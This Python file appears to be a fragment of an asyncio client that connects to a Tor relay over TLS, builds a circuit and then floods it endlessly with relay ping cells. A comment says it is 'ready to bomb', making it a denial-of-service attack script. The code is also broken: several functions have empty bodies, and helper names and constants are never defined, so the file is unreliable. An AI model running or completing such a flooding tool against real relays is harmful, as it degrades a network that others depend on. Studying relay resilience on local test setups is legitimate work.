#!/usr/bin/env python3
# not stdlib
# import stem
# stdlib
import asyncio
import hashlib
import ssl
import sys

shutdown_event = asyncio.Event()



class MyProtocol:
    def __init__(self, relay_hostname):

    async def send_data_forever(self):
        await self.done_handshaking.wait()
        print('Done handshaking ... waiting for circuit')
        await self.done_making_circuit.wait()
        print('Done making circuit ... ready to bomb')
        data = b'K' * MAX_PAYLOAD_BYTES * 100
        while True:
            for d in chunk(data, MAX_PAYLOAD_BYTES):
                cell = make_relay_ping_cell(self.circ.id, d)
                self.conn.write(self.circ.encrypt_cell(cell))
                await asyncio.sleep(0)
        # shutdown_event.set()


    def eof_received(self):
        pass



def get_ssl_context():


async def main(loop, host, port):
    conn = await loop.create_connection(
        lambda: MyProtocol(host), host, port, ssl=get_ssl_context())
    await shutdown_event.wait()


if __name__ == '__main__':
    host, port = sys.argv[1:3] or '127.0.0.1', '2002'
    port = int(port)

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(loop, host, port))
    loop.close()
